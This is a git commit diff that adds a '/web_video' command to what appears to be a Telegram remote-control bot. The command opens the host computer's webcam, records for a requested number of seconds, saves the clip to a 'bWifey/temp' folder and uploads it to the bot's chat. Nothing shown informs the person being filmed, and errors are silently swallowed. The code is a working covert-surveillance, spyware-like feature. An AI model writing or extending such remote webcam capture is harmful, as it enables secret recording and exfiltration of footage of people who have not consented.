8d89a1cbe1a83d738d1cbe8413d73a5b182a0ed5
Stadnikov Rostislav <stadnikov2000@gmail.com>
2024-02-07 23:19:05 +0200

    Add camera record function

--- handlers/wweb.py
+++ handlers/wweb.py
@@ -5,6 +5,7 @@ from aiogram.enums import ChatAction
 import pyautogui
 import cv2
 import io
+from datetime import datetime
 
 
 
@@ -25,3 +26,27 @@ async def web_photo(message: Message):
 	except:
 		pass
 				
+
+
+@dp.message(Command("web_video"))
+async def web_video(message: Message):
+	try:
+		try:
+			seconds = int(message.text.replace("/web_video ", ""))
+			cap = cv2.VideoCapture(0)
+			fourcc = cv2.VideoWriter_fourcc(*'XVID')
+			out = cv2.VideoWriter("bWifey/temp/cam_record.avi", fourcc, 15, (640, 480))
+			current_time = datetime.now()
+
+			while((datetime.now() - current_time).seconds <= seconds / 2): 
+				ret, frame = cap.read()  
+				out.write(frame)
+
+			out.release()
+			await bot.send_chat_action(message.chat.id, ChatAction.UPLOAD_VIDEO)
+			await bot.send_video(message.chat.id ,FSInputFile("bWifey/temp/cam_record.avi", filename="cam_record.avi"))
+		except Exception as e:
+			await bot.send_message(message.chat.id, "Помилка запису")
+			await bot.send_message(message.chat.id, str(e))		
+	except:
+		pass		
